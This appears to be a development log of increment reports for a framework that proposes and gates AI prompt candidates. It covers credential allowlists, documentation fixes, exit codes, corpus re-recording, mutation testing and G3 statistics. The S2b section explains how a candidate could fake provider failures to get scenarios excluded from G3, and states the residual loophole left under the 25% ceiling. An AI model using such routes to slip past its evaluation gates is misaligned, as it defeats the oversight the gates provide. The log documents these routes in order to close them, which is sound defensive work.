`HOME` +`USER` → `OK`; `PATH`+`USER` alone → `OK`. So `USER` and only `USER` —
not `HOME` (the credential is not in the config directory), and **not the other
conventional spelling of the same fact**, which is ADR 0150's rule one more
time. The table lives in `HARNESS_LOGIN_ENV`'s docstring, next to what it
justifies. `DEFAULT_ENV_ALLOWLIST` is unchanged, and two tests say so out loud,
because the obvious fix is one word on that line and it would let every gate
pass on every repo spend the operator's quota with nobody asked.

**F-M5-2**: `_live_provider_from_base_ref` put `{impl, model}` on the wire, so
`impl: command` — the provider needing **no credential at all**, the one ADR
0154 points every new adopter at — was refused worker-side (`worker refused
configuration: … no `command:` block is present`) and G2 reported that as a
behavioural regression. `ModelProviderConfig` is data; the validated block
crosses whole now and `model_validate` rebuilds it, argv template, output
pointer, `isolation:` assertion and fallback chain intact.

**The live proof**, same pilot clone, persona, proposer and flag as ADR 0158:

```
G2 pass  2 scenario(s) re-executed; every previously-passing one still passes.
G3 fail  candidate does not beat the p95 of the random control cohort
evidence: 7 corpus pass(es) (14 scenario execution(s)) … live_model_calls: True
```

ADR 0158 got `G2 fail — 2 previously-passing scenario(s) no longer pass` out of
29 `claude -p` runs that exited in ~30 ms with `Not logged in`, and its whole
gate pass took 20 seconds. This one took 115 and served 12 live misses inside
the worker. **Same verdict word, completely different claim**: the rejection is
a judgement of the prompt now, and G3's arithmetic is what said no. Drift
0.007/0.500. Acceptance is *reachable*, not reached — **this fixes the
apparatus, not the learning**, and the two should not be confused: the
rule-based lesson still moved nothing, exactly as ADR 0157's falsification and
0158's paired `loop score` predicted.

Both defects reached G2 as an ordinary regression, so **the exit code and the
verdict cannot distinguish a live gate pass from the two defects that made one
impossible** — which is why the live test now asserts `live_model_calls is
True`, asserts real executions in the evidence line, and asserts that neither
`worker refused configuration` nor `Not logged in` appears in the run.

**Green bar:** `pytest -q` 2700 passed / 7 skipped / 1 xfailed, `mypy aef
examples` clean (135 files), `ruff check .` clean, `ruff format --check` clean.
**+19 tests, 2689 → 2708**, and the two strict xfails became passing tests
rather than being deleted. **6 mutations planted, 6 killed**, every restore
sha256-verified. **18 live calls** of a ≤30 budget. **No rubric dimension
moves** — this is apparatus.

**Reported, not fixed:** the one remaining strict xfail in
`tests/cli/test_prompt_repo_acceptance.py` is F-M5-1 (obligation 6's
every-graph scan, unreachable under a widened root), which belongs to another
worker; and the generated `FIRST_DAY.md`/`aef.yaml` templates say nothing about
the new opt-in — the exact paragraph M7 should place is in ADR 0181.
## M7 — the documents say what is now true (ADR 0183)

Wave 3 of `UPGRADE_LOOP.md`. Six documents audited against ADRs 0151–0180
under ADR 0148's rule — *every claim from a command that was RUN*. Model
`claude-opus-5[1m]`; **zero live model calls** (a copy of the marlin pilot
clone, `model_provider.impl: command` with `/bin/echo`). No rubric dimension
moves.

**Fourteen sentences were false or stale, and none of them made a test fail.**
That is the finding. A document is the one artifact here with no green bar of
its own.

### The nine in the three hand-written documents

| document | the claim | the fact |
|---|---|---|
| `CLAUDE.md`, `docs/roadmap.md` | "LLM-backed reflection … typed interfaces raising `NotImplementedError`" | `llm_reflection.py` has had a body since ADR 0115; it is off by **four measurements** (0115, 0155, 0171, 0175), which is a much stronger sentence than "stubbed" |
| `CLAUDE.md` | migrate wires `prompt_agent -> reflect -> consolidate -> END` | four nodes, `retrieve` first (0179) — read off the generated module, not off the report, which still says the old thing |
| `CLAUDE.md`, `AGENT_INTEGRATION.md`, the kit | "the prompt runs; the agent's tools do not" | per-provider. `grok`'s identical `--tools ""` **suppresses nothing** on 1.0.5 (0169) |
| `CLAUDE.md` | "real for **three** backends" | five (0154) |
| `CLAUDE.md`, `docs/roadmap.md` | ADR 0110's `knowledge_boost` sweep — "changed no coverage number anywhere, so the benefit is consolidation, not ranking" | S1b: the knob **does** change ranking (0/17 vs 10/17 in prompt) and does not change the task metric; and the coverage proxy is disproved for this corpus (0175) |
| `CLAUDE.md` | "**50 → 79**" | a self-score. J0 re-scored the same code at 68; the rubric's heading is `grep`ed instead — **72 / 100** (0151) |
| `CLAUDE.md` | "without ever **overwriting** an existing file" | never-**destroy**, five signed blocks, enforced by `_verify_preserved` (0153/0172) |
| `CLAUDE.md` | "reads none of your existing code" | it import-scans to label it |
| `AGENT_INTEGRATION.md`, `docs/roadmap.md` | knowledge is "**not reachable from an `aef.yaml`** — `MERGE_READY_LOOP.md` A1" | `build_retriever(knowledge=...)` exists; closed by ADR 0118 and the sentence outlived it by a release |

### The one that mattered most

**The generated prompt-file sequence could not propose a candidate on any
repo.** Three independent reasons, each found by running it:

1. no `--agent-root`, so the persona is Zone C and G0 rejects any edit to it;
2. no `--proposer rule_based_prompt`, so the numeric proposer ran against a
   file with no constants;
3. no `--graph-id`, so ADR 0176's warning fires and every failure record is
   dropped as another graph's — **exit 0, having done nothing**, which is the
   exact shape `LOOP.md`'s own opening paragraph exists to prevent.

It had been through three ADRs and a parser-level test, because every command
in it *parsed*. That is the case that shows parsing is not running.

Rewritten and RUN end to end on the pilot copy: proposed a 4-line `.md`
candidate, `G0/G1/G4/G5 pass` at drift **0.003/0.500**, G2 verdict, exit 1 —
ADR 0158's shape on a repo aef-core did not write, at zero model cost.

### Also added, each traceable to a command

The four exit codes and what each means (`3` = the command could not do its
job; fail CI on `>= 2`); the required `--memory`/`--no-memory` with its real
refusal text; the file-path graph reference (there is no dotted module under a
widened root) and the persona `--agent-path` form with its real `doctor`
output; check-derived failure memory and the measured cost of redacting the
check's value; and the sentence that says a prompt candidate **cannot yet be
accepted** on live evidence — the gates' worker has no login and the
credential-free provider cannot cross the worker boundary (0158). K1 has not
landed, so that sentence is M5's honest one rather than a `gates.live_model_calls`
description.

`corpus/README.md` gains the provenance table S6 asked for, derived from
`model_calls[].result.model` — which was on disk the whole time and nothing
read it: **20 scenarios recorded on `claude-fable-5-1` that cannot be
re-recorded**, 6 of them 6/17 of the validation split, 19 on Opus, 11 with no
model call at all.

### K1 landed mid-increment, and one of these sentences went stale in an hour

`origin/main` was merged before finishing, as the loop file allows, and **K1
(ADR 0181) had landed** — closing both of ADR 0158's HIGH findings and their
two strict xfails. So the sentence written four commits earlier in this same
increment — *"a prompt candidate ... cannot yet be accepted on live evidence,
and no flag changes that"* — was true when written, false four hours later,
and **a flag is exactly what changed it**.

Every copy retired in one pass, and the `gates:` block placed in the generated
`aef.yaml` (ADR 0180 named it as M7's; it round-trips through
`load_agent_config`). The documents now say what ADR 0181 decided: live model
calls inside the gates are an explicit per-repo opt-in, off by default, read
from the base ref so a candidate cannot grant itself the operator's login, and
`--cassette-miss live` is **refused by name** without it rather than producing
a `G2 fail` about a subprocess that could not log in.

**The pin moved with it, and the direction matters.** It had pinned the
*limitation*; it now pins the **flag** and its **refusal**. A pin on a
limitation has an expiry date, and this one expired inside a single increment.

### Pins

Five load-bearing sentences in `tests/test_prompt_surface.py` — the live-gating
opt-in and its refusal, exit code 3, containment per-provider, the Fable
recordings — whitespace-collapsed so a reflow does not break them, controlled
against a surface that legitimately says none of them, with the corpus table
**re-derived from the scenario files inside the test** so the document cannot
drift from the data. 5 mutations, 5 caught, byte backups sha256-verified.

Two of the five needed the RIG fixed before they meant anything. M4 first read
MISSED (the phrase occurs twice; only the first was perturbed). M5 first left
the control RED after a restore whose sha256 was proved unchanged — the source
was byte-identical and the **bytecode** was not: `"refused by name"` and
`"quietly skipped"` are both fifteen characters, so the mutated and restored
files shared a size and, within one second, an mtime, which is the pair
CPython's `.pyc` invalidation compares. A same-length mutation is the easiest
to write and the likeliest to be silently cached; the rig runs every arm with
`PYTHONDONTWRITEBYTECODE=1` now.

One pin moved deliberately: `test_the_kit_names_every_wired_harness_and_guesses_at_none`
pinned the literal `not** reproduced`, which pins markdown rather than a fact.

### Green bar

```
pytest -q            2735 passed, 7 skipped, 1 xfailed   (after merging origin/main;
                     the two xfails K1 closed are passing tests now)
mypy aef examples    Success: no issues found in 135 source files
ruff check .         All checks passed!
ruff format --check  279 files already formatted
```

Every emitted `aef` command still parses: **55 checked, 0 failed** (up from
the 50 floor).

### Reported, not fixed

`aef migrate`'s report prints `wired prompt_agent -> reflect -> consolidate ->
END` while the module it writes in the same run has four nodes — one fact, two
owners, kept correct in one (`aef/cli/migrate.py` is another worker's file).

## Fix wave K3 — a crash, a spelling, a namespace, and a fact nobody printed (ADR 0182)

Five findings other workers left **named and open**: ADR 0178's *Still open*,
ADR 0176's outside-defects 1, 2 and 3, ADR 0179's *Open and named*, and one
handed over mid-wave after ADR 0180's S1b measurement. Every one reproduced by
RUNNING a command before anything changed. **Zero live model calls** — the one
reproduction that needs a provider drives a local stub script through
`model_provider.impl: command`. **No rubric dimension moves**: nothing here
adds a capability.

**K3-1 — eleven of thirteen `aef loop` subcommands reported a crash as exit 1.**
That is ADR 0167's R3 — *a crash's remedy is not a rejection's* — still standing
for the majority of the surface after G1a fixed `cycle`/`run` and ADR 0167 fixed
`doctor`/`bless`. `aef loop score … --splits bogus`, `aef loop record --corpus
<a path under a plain file>` and `aef loop harvest <a missing module>` each
printed `error: …` and returned **1**, which is `EXIT_REJECTED`, "the candidate
was rejected, the system is working" — while the nightly workflow fails the job
on `-ge 2` and, since ADR 0178, gives exit 3 its own summary telling the owner
to fix the invocation.

The fix is a **wrapper over every handler `add_loop_parser` registers**,
including the nested `loop corpus reconcile` that neither ADR's count of
thirteen had reached, so a fourteenth subcommand is covered without being told
to be. **Deliberately not `main()`'s catch-all**, and this is the load-bearing
choice: `aef adopt`, `migrate`, `init`, `run`, `eval`, `trace` and `doctor`
issue no verdicts, so 1 is the ordinary "this command failed" every CLI returns
and nothing distinguishes a rejection from a crash for them. Moving seven
commands onto a vocabulary they do not use, to fix a defect in the one that
does, is a fix wave strengthening a control nobody has reproduced a problem
with (ADR 0141's rule). `test_a_top_level_command_still_returns_one` asserts the
catch-all is unchanged rather than leaving that in a comment.

A **named refusal stays a rejection** — and the suite found one handler relying
on the catch-all for one: `cmd_record` let `RecorderError` through, which is how
ADR 0149's tripwire guard ("refusing to label a scenario `must_fail` when the
agent completed the task") reported itself. It is caught by name now, as
`cmd_bootstrap` already did, and that test is green on its original assertion.

**K3-2 — `run --module` was the last in-process caller on the old loader, and
`--entrypoint` was a fourth spelling of "which graph".** I1's note was
**verified against current main rather than assumed**: ADR 0177 gave the
loaders one *importer* and left the *splitter* demanding `module:factory`, so
`aef loop cycle --module agents/x/graph.py --entrypoint agents/x/graph.py` still
accepted the first and refused the second inside one invocation. All four
combinations of three loaders × four spellings are in the ADR, run.

`split_entrypoint` becomes the union rule ADR 0176 wrote for the CLI, and moves
into `aef/harness/graph_loading.py` with `GRAPH_REFERENCE_HELP` — because
`--entrypoint` is read by the harness and **the harness may not import the
CLI**, and a second copy there is the ADR 0149 shape. That it reaches
`node_worker` too is the point rather than a side effect: those are the two
sides of G2, and ADR 0177's whole finding is that an import error on one side
only is indistinguishable downstream from a behavioural regression. `cmd_run`
uses `load_graph_reference` (gaining ADR 0085's `BaseException` guard for the
first time), and one `ENTRYPOINT_HELP` replaces three descriptions of one flag,
all three of which were wrong about what it accepted.

**K3-3 — `LoopConfig.graph_id` was one field for two namespaces.** ADR 0125
separated the archive key from the `Graph.id` the prompt proposer admits
records under; one field could not serve both, so ADR 0176's F2 had to keep a
warn-instead-of-fix branch — deriving the id moved the archive key out from
under a blessed baseline and G5 then rejected every candidate for having
nothing to compare to. The configuration left broken is the **documented**
one: `aef loop bless` takes no `--corpus`, so the first-week sequence blesses
under `default` while the corpus records `demo_agent`.

`evidence_graph_id` (`None` meaning "the same as the archive key", so every
existing caller is byte-for-byte unchanged) is read by `_build_proposer` and
nothing else. `resolve_graph_id_from_corpus` never moves the archive key again,
and the rule collapses from four cases with two warnings to one derivation with
one refusal — the refusal on an ambiguous corpus, which is unchanged and is the
only warning left, because which graph's evidence a turn may ground in is still
not guessable.

**K3-4 — the containment warning was recorded and printed nowhere.** ADR 0179
moved `prompt_agent.persona_in_user_turn` out of `state.errors` and named
`containment_warnings(state)` as its reader, then said plainly that nothing
called it. Reproduced end to end: a real `aef migrate`d prompt agent
bootstrapped through a real slotless `command` provider, the fact demonstrably
on the recorded scenario, and neither `doctor` nor `cycle` mentioning it.

`aef loop doctor` prints `[!!] persona channel  prompt_agent: persona sent in
the USER turn by provider '…' (isolation: …) — see ADR 0179` **below** the six
obligations and outside them, because a property of a CLI the owner already
installed has no `fix:` that is an edit in this repo, and listing it would make
`doctor` exit 1 forever on a correctly configured Codex adopter — ADR 0179's own
finding, one surface over. Cycle and gate print the same sentence, one line per
**distinct provider**. `--memory` is not a source, and that is asserted rather
than commented, because ADR 0179's finding is precisely that this fact never
becomes a memory record.

**K3-5 — `aef loop score --memory`**, handed over after ADR 0180's S1b measured
that wiring the check-failure producer into `bootstrap` alone lets staleness
walk a lesson out of the prompt while a scored split never re-sees it
(`runs_since_last_seen` 17 → 0). Opt-in, off by default, in-process only:
scoring writes exactly one check-derived failure record per failed check, and a
second score or `--repeat 3` writes none. **ADR 0174's refusal of the gate path
stands** — an AST scan asserts `aef/cli/loop.py::cmd_score` is the only caller
that supplies a durable store.

**Green bar:** `pytest -q` 2788 passed / 7 skipped / 1 xfailed, `mypy aef
examples` clean (135 files), `ruff check .` clean, `ruff format --check` clean.
**+68 tests, 2679 → 2788** on this worker's baseline (the `origin/main` merge
with K1 and K2 accounts for 41 of the difference), counted per file in the ADR.
**14 mutations planted, 14 killed**, every restore verified byte-identical by
SHA-256; `git checkout --` was never used.

**Two mutations SURVIVED their first version, and both are the reproduce-first
rule earning its place.** M3 — delete the wrapper's journalling — survived
because the test meant to prove it raised inside `cmd_cycle`'s *own* `try`, so
the handler journalled it and the wrapper was never exercised; the fault is
planted in the pre-`try` region now. M13 — a gate path supplying the durable
store — survived because the owner-only scan asserted a FILE, so a call planted
in `cmd_gate`, the same file, walked past it; it asserts `file::function` now.

**Reported, not fixed** (in the ADR's own section): the cassette recorder masks
the provider name in the containment record, so an adopter's surfaced line says
`provider: 'cassette'` rather than `'codex'` while `isolation` passes through
correctly; `aef migrate`'s report still says the node "appends a
`prompt_agent.persona_in_user_turn` error", which ADR 0179 made false; and `aef
loop bootstrap` returns `EXIT_REJECTED` where `cycle`/`run` return `EXIT_USAGE`
for the equivalent missing-flag refusal.

---

## S0b / J0b — the second independent score (ADR 0188)

72 → **69**. Five dimensions moved: 1, 4, 7 down (each verified; the dim-1 defect fixed in the same commit), 5 and 6 up (the reviewer found the artifacts). Report: `docs/research/j0b-independent-score-2026-09-05.md`.

## S3c — one model across the corpus, and what it cost (ADR 0186)

**Planted.** ADR 0162's defect 1, which that worker reported and could not fix
because `corpus/` was not its file: *"Six corpus scenarios are
`claude-fable-5-1` recordings … Any future measurement that treats the
validation split as one model's output is wrong by 6/17 … This worker's
`load_pairs` refuses them; nothing else does."*

**The count is 20, not 18.** Read out of every cassette rather than out of a
document: `{'claude-fable-5-1': 20, '': 11, 'claude-opus-5[1m]': 19}`.
`sum-01`…`sum-18` in train/validation **plus `sum-19-tram-depot` and
`sum-20-seed-bank` in the holdout**, which no prior ADR names. (The eleven `''`
are `agents/demo` scenarios that call no model.)

**Eighteen re-recorded on `claude-opus-5[1m]`; the two holdout ones
deliberately not.** `record_run` refuses to write the holdout without
`allow_holdout=True` — *"the owner's only independent read"* — and spending it
is an owner's act, not a worker's. They are declared exceptions, named in the
test and in the provenance table, left for an owner. The cost is stated rather
than buried: the holdout is a Fable read of an Opus corpus and should not be
cited as this agent's independent score.

**Method.** No `--force` exists and `refuse_existing_ids` is right to refuse,
so each file was sha256'd, copied byte-for-byte to
`docs/research/i14/fable-recordings/<id>.json`, deleted, and re-recorded with
the **same id, split, agent id, objective, `working_memory`, `budget_ms`,
`expected` and byte-identical owner `checks`**, all read off the archive.
Nothing re-authored. `model: ""` in the recording config so no `--model`
reaches the CLI (S3b's rule, ADR 0171).

**The proof that only the answer moved is the cassette key** — a hash of the
request. Every one is unchanged (`sum-01`: `d4fc36cc…8e5117` before and
after), asserted per file alongside a key-by-key diff permitting only `trace`,
`model_calls[*].result`, `recorded_at`, `notes`, `source` to differ. `OK: 18
re-recorded … OK: no other corpus file changed, manifest included OK: all 18
archived recordings are byte-identical to HEAD`.

**Measured** (`aef loop score --json`, cassette replay both sides, 37 hits /
0 misses / 0 live calls each — no variance in either number):

| | before | after |
|---|---|---|
| train | mean **0.9675** n=20, 3 negatives | mean **0.9275** n=20, **7 negatives** |
| validation | mean **0.9529** n=17, 4 negatives | mean **0.9059** n=17, **8 negatives** |

**Eight of eighteen changed verdict, all 1.0 → 0.8, all `max_words`** —
`sum-04`, `05`, `08`, `11` (train), `sum-13`, `14`, `16`, `17` (validation),
over by 1–6 words. **Zero content checks moved in either direction**: every
required term is still present in every re-recording. That is ADR 0171's
finding — *"this agent's one reproducible failure is length"* — replicating on
eighteen scenarios it did not use. The family is now n=15 and still one family.

**The mechanism, as far as this measures it.** On the identical prompt: mean
words Fable 32.28 → Opus 35.17 (+2.89), **14 longer, 0 shorter**, 4 the same
count, no two summaries the same text. The caps did not move; the writer did.
One task family, one cap range, n=18 — not a general claim about either model.

**What it invalidates.** ADR 0171's v2 judge A/B ran over 17 validation states
of which 6 were Fable's (`sum-13`…`sum-18`), and 4 of those 6 have different
verdicts now. Its 13/17 constant baseline is now 9/17 and its AUC 1.000 was
over 13×4 pairs where the same statistic would now be over 9×8. `results-v2.jsonl`
is left untouched and un-re-run: 34 calls, and 19 of a 24 budget were spent.
**No `results-v3.jsonl` exists**, and citing v2's number for this corpus would
be wrong. The corpus is *better* for grading a judge (8 validation negatives
instead of 4) — a reason to re-run it, not to assume its answer.

**For S6's successor.** `run_j4_selfpref.py:176`'s refusal **stays** — it is
the guard that caught this. What lifts is the exclusion it forced: `SELECTED`
at line 110 may now be the whole validation split, 17 pairs instead of 11 (37
with train), and the discriminating subset grows with the eight new negatives.

**Tripwire.** `tests/harness/test_corpus_provenance.py` — one model family
across the corpus with the two exceptions named as a *set*; the exceptions are
holdout-only; train/validation carry no exceptions at all; and every archived
recording still matches its replacement on checks, initial state, split,
`expected`, `budget_ms` and cassette key. Families compared with the `[1m]`
suffix stripped (ADR 0169), because a guard defeated by a suffix is not one.

**5 mutations, 5 caught**, every restore sha256-verified, control `4 passed`
before the first and after the last: a train answer re-attributed to Fable (2
failed), the holdout silently re-recorded on Opus (1), an exception moved
holdout→validation (2), an owner check widened post-recording (1), the passage
edited post-recording (1).

**Green bar:** `pytest -q` **2720 → 2724** (+4), 7 skipped, 1 xfailed; `mypy
aef examples` clean (135 files); `ruff check .` clean; `ruff format --check`
281 files formatted. **19 live calls of ≤24** — 1 preflight (ADR 0150's argv,
`is_error false`, `input_tokens 2`, `modelUsage` → `claude-opus-5[1m]`) and 18
recordings, none retried, every `stop_reason` `end_turn`, every one
`model_attribution: "usage_match"`. **No rubric dimension is claimed** — this
is corpus hygiene with a measured, unflattering consequence.

**Reported, not written:** the provenance table for `corpus/README.md` is in
ADR 0186 (M7 owns that file), and the two holdout recordings need an owner
decision before the holdout can be read as this agent's behaviour.

## M8 — two more repos, and the one that exited 0 having done nothing (ADR 0187)

**Zero live model calls.** `model_provider.impl: command` with
`argv: ["/bin/echo", "{system}", "{prompt}"]` throughout — M5's offline form
(ADR 0158). `aef/` untouched: every defect is a finding with a reproduction,
pinned as a strict xfail, handed to the fix wave.

ADR 0158 proved the documented sequence on a clone of `marlin`. One repo is one
repo — every assertion in that test could be true because marlin happens to be
shaped that way. So the same sequence, unchanged, on clones of the other two
prompt-file repos in `UPGRADE_LOOP.md`'s survey.

**Both completed and reached a gate verdict.**

| | `keystone` | `datamining` |
|---|---|---|
| detection | `prompt_files (7 agents, 4 skills, AGENTS.md, .codex)` | `prompt_files (13 agents, 6 skills, AGENTS.md)` |
| personas found / on disk | 7 / 7 | 13 / 13 |
| skipped · refused · collided | 0 · 0 · 0 | 0 · 0 · 0 |
| `AGENTS.md` bytes | verbatim prefix, `36 0` numstat | verbatim prefix, `36 0` numstat |
| tracked files | 192 | 1109 |
| gate pass | 17.4 s, `G2 fail`, drift 0.008/0.500 | 63.2 s, `G2 fail`, drift 0.004/0.500 |

The `G2 fail` is expected and is the proof the gates ran: `--cassette-miss fail`
plus a changed prompt is a changed cassette key, so every recorded call misses.
Behind each one is a real cohort — `1 candidate + 1 incumbent + 5 random
control(s)`, 21 scenario executions of a real graph (ADR 0170). Both candidate
diffs are exactly the persona; both repos stayed on their own branch.

**Four shapes no fixture in this repo had.** A persona whose `name:` is not its
filename (`source-agent.md` carries `name: marlin-source`, so the module, the
graph id and the file are three different strings). Five persona-shaped `.md`
files under directories literally named `agents/`, inside keystone's
`verify-and-ship` lint corpus, plus two nested `SKILL.md` — `find` says 6
`SKILL.md`, `discover_skills`'s one-level glob says 4, and it is right; none of
the five was migrated. `model:` frontmatter on 12 of datamining's 13, reported
per persona (`model, tools` for `publisher`, `tools` alone for
`data-floor-lead`), read and never obeyed. And a `CLAUDE.md` **tracked as a
symlink to `AGENTS.md`**, which adoption refuses by name — load-bearing, because
both names are one inode and appending to both would put two signed blocks in
one file. Measured after: `<!-- aef:begin sha256=` appears once, `CLAUDE.md` is
still a symlink.

**F-M8-1 (HIGH) — a non-`main` default branch no-ops, and exits 0.**
`datamining`'s default branch is `azure-agent/uptime-monitoring`; there is no
`main` in the repository at all. adopt, migrate, bootstrap, bless and doctor all
succeeded and said nothing about it, then:

```
  no agent source at .claude/agents/dev-agent.md in main: no candidate
EXIT=0
```

The persona is present, committed, and was blessed one step earlier; what is
absent is the ref. `path_exists_at` cannot distinguish an absent FILE from an
absent REF, so the message blames the file — and `no candidate` at exit 0 is
also what a legitimate empty proposal prints twelve lines above, so an operator
who has learned that `no candidate` is normal cannot see that this one is not.
No `doctor` obligation covers the base ref. `aef/harness/zones.py` already names
this exact shape in a comment, for the default agent PATH that ADR 0149 fixed;
the default base REF was left behind. Reproduced on a scratch repo whose only
difference from the passing case is `git init -b trunk`. Workaround used:
`--base azure-agent/uptime-monitoring`, after which the cycle reaches a verdict
identically to keystone's.

**F-M8-2 (LOW)** — `migrate` prints `found N skill(s)` over N+1 rows, on both
repos (4/5 and 6/7): the header is the adopter's count with aef's own skill
excluded (ADR 0172 D4, so it stops changing every run) and the list is the raw
listing with aef's included and labelled. Each half deliberate; the composition
is a report wrong about itself.

**F-M8-3 (MEDIUM)** — when `adopt` SKIPS `CLAUDE.md`, the checklist it prints in
the same output still opens `1. Read the generated CLAUDE.md in full before
writing any code.` On datamining the link points at `AGENTS.md`, which did get
the block, so it accidentally works; reproduced with the link pointing at
`README.md`, step 1 names a file containing `# scratch\n`.

**The test.** `tests/cli/test_second_repo_acceptance.py` — a synthetic fixture
built from the shapes above (7 flat personas with `name:` != filename, no
`tools:` key, the lint-corpus noise, the `CLAUDE.md` symlink, `.codex/`, hooks),
driven through the same sequence and asserted against `ledger.jsonl`: a verdict
was **reached**, never which one. Plus an explicit assertion that `no candidate`
is not in the cycle's output — F-M8-1's shape.

**What "works on a repo nobody wrote to pass" now covers**: three repos, one
owner. **What it does not**: a third party. All three share one house style and
one author of both the personas and this scaffold's expectations of them, so the
correlated failure — a convention all three happen to share — is exactly what
three repos from one owner cannot detect. S7's last +3 stays unclaimed.

Green bar: `pytest -q` **2722 passed, 7 skipped, 4 xfailed**, 2728 -> **2733
collected** (+5, none removed). `mypy aef examples` 135 files clean.
`ruff check .` clean. `ruff format --check aef tests examples` 281 files clean.
Artefacts in `docs/research/second-repo/` (both transcripts + the
reproductions), scanned with `aef/harness/redaction.py` — clean.
**No rubric dimension moves** (adoption claims no point).


## S2b — a dead call is not a wrong answer, and the pairing the mean cannot do (ADR 0185)

Two increments against G3, both "strengthen or report". **No threshold moved.**
The p95 rule, `DEFAULT_MIN_COHORT_SIZE`, `PASS_THRESHOLD`, `DEFAULT_MAX_COST_RATIO`
and every constant ADR 0170 froze are byte-for-byte what they were, and
`tests/harness/test_g3_improvement.py` and `tests/harness/test_promotion_safety.py`
were not touched. **Zero live model calls**: every number here is either ADR
0156's committed output or a stub `impl: command` provider — a shell script
that exits non-zero on chosen invocations, a real subprocess through the real
`CommandProvider`.

### A — the failure string that nothing read

ADR 0156 measured the live floor on Opus at **mean 0.7639, spread 0.1666**, and
attributed ~a third of that spread to one transient call failure. Its evidence
for that attribution was *token accounting across repeats*, because a provider
that raises and a provider that returns `""` both produce exactly
`score=0.0000, cost_tokens=0`.

Reproduced before anything changed — four scenarios, `--cassette-miss live`, a
provider that exits 7 on its third call:

```
s3: score=0.0000 cost_tokens=0
    failure='NodeEvaluationError: ModelProviderError: flaky.sh exited 7: provider fell over'

G3 fail: 1 previously-passing scenario(s) now score below 0.5
         (zero tolerance, regardless of the aggregate)   evidence: s3
```

`run_corpus_isolated` computed that string, `VariantRun` carried it, and
**nothing read it**. G3 rejected a candidate for a scenario it was never asked.

**The rule now.** A scenario whose failure chain names a `ModelProviderError`
**on a live run** is a dead call. The live condition is the whole safety of it:
under the default `on_miss="fail"` no call is attempted, so a `ModelProviderError`
there is `CassetteProvider` reporting a **miss** — a *behavioural* difference,
and the strongest signal the gates have, since ADR 0123 caught the very
regression ADR 0156 could not see live by scoring it **0.0000 with 36 misses**.
Excusing that as a dead call would have thrown the best evidence in the repo
away. Every replayed pass is therefore unchanged, and the mutation that removes
the condition fails a test.

A dead call is **retried once** — bounded because an unbounded retry is an
unbounded bill, and because the second death is itself the signal — and if it
dies again G3 **excludes it symmetrically**: from the candidate, the incumbent
and every control, named in the evidence with the surviving `n=`.

**Excluding is a strengthening, and that is measured rather than argued.** The
threshold G3 gates on is p95 of the *cohort's* means, and a cohort has five
members to the candidate's one — so most dead calls land in a control, where a
0.0 drags that member's mean down, drags p95 down, and **lowers** the bar.
`test_excluding_a_dead_call_in_a_control_RAISES_the_bar` runs the same candidate
both ways: counted it passes, excluded it does not.

**The floor that stops the obvious attack.** `is_dead_call` reads a string, and
a candidate under `--cassette-miss live` can raise `ModelProviderError` itself.
Nothing reading a string can tell that apart. So past **25% dead** G3 stops
judging: `could not judge: 4 dead call(s) of 6 scenario(s) (67%), over the 25%
ceiling` — a FAIL, therefore an escalation, and a candidate that makes the
provider die is not thereby cleared. End to end against the stub provider:

```
(a) dies on call 3         -> retried, rescued.   "retried once and answered on the second attempt: s3"
(b) dies on calls 3 and 4  -> excluded, n=6 -> 5. "excluded 1 of 6 scenario(s) from BOTH arms …"
(c) dies on nearly all     -> "could not judge: 4 dead call(s) of 6 scenario(s) (67%)"
```

The residual is stated rather than hidden: a candidate can still kill up to a
quarter of the corpus and have those scenarios excluded rather than counted.
On six scenarios that quarter is one. More scenarios is the fix — the same fix
ADR 0156 named for the floor — not a tighter fraction, which on six scenarios
would mean refusing every live pass.

### B — the paired line, beside p95 and gating nothing

ADR 0156 offered this with the data and did not make it: *"a sign test over
paired scenarios would have flagged the regression where the mean could not."*
Built now from its own committed per-scenario JSON, and **read by no branch in
`g3_improvement.py`** — `test_the_paired_direction_changes_no_verdict` gives two
candidates the same mean and opposite paired directions and asserts the same
outcome and the same reason string.

Pooled over all 18 (scenario, repeat) observations of the floor arm vs the
planted-regression arm:

```
paired: 7 down / 3 up / 8 same (sign test p=0.3438)
```

against a mean-of-means fall of **0.0278** on a floor spread of **0.1666** —
0.17× of it, invisible, which is why dimension 1 correctly did not move in S2.
`sum-17-clockmaker` and `sum-18-heron-rookery` are down in **3 of 3** repeats
each.

**And the honest half, pinned in tests so nobody reads the line as a verdict:**
p = 0.3438 does not reach significance, and per repeat — six pairs, which is
what one real G3 pass sees — the same data gives p = 0.625, 1.0, 1.0.

**Where the two increments join.** `sum-13` repeat 3 scored 0.00 because its
call died; paired against the regression arm's 1.00 that reads as the planted
regression *improving* a scenario. Excluding it removes a wrong-signed
observation: 7/3 (p=0.3438) becomes **7/2 (p=0.1797)**. A dead call is not just
noise in the mean.

**Should it ever gate? Argued, not implemented.** For: it sees what the mean
provably cannot, and removing between-scenario variance is the standard answer
to G3's own stated problem. Against, and stronger today: six pairs cannot reach
p<0.05 by a sign test even unanimously; one scenario flips the verdict and
magnitude counts for nothing; and a paired candidate-vs-incumbent test
reintroduces exactly the "beats the incumbent" comparison ADR 0051 built the
cohort to refuse. What would settle it: ≈40 scenarios (ADR 0156 consequence 2's
number), a true-null arm, every p95/paired disagreement recorded, **run twice**,
and a measured false-positive rate before any threshold is proposed.

### Erratum on ADR 0156

**Its floor includes a dead call.** ADR 0156 identified repeat 3's `sum-13: 0.00`
as a harness/model failure and deliberately kept it — *"a property of live
scoring, not an artefact to be excluded — a gate pass will meet it too."* Right
about the world, wrong about the gate: a gate pass now retries it and, if it
repeats, declines to score it. Re-aggregated from ADR 0156's own data under this
rule (symmetric, so the regression arm moves too, 0.7361 → 0.7194):

| | floor repeats | mean | spread | the planted regression's fall |
|---|---|---|---|---|
| as published | 0.8333 / 0.7917 / 0.6667 | 0.7639 | 0.1667 | 0.0278 = 0.17× the spread |
| dead call excluded | 0.8333 / 0.7917 / 0.8000 | **0.8083** | **0.0417** | 0.0889 = **2.13×** the spread |

> **The bar a future S2c should clear: 0.8083, spread 0.0417.**

And under it ADR 0156's planted regression *would* have been detectable by the
mean — 4.0 standard deviations of the means. That is arithmetic on three
repeats with one exclusion, **not a re-run**; removing the worst score of the
worst repeat mechanically raises the floor and shrinks the spread. Nothing in
the rubric moves on a re-aggregation. S2c should measure it.

### Verification

Six mutations planted, six caught; byte backups, sha256 verified before and
after, nothing restored with `git checkout --`.

| mutation | detected by |
|---|---|
| M1 score the dead call 0 again (drop the exclusion) | 2 failed |
| M2 drop the refusal floor | 2 failed |
| M3 drop the bounded retry | 2 failed |
| M4 classify a replayed cassette MISS as a dead call | 2 failed |
| M5 make the paired line always report all-same | 5 failed |
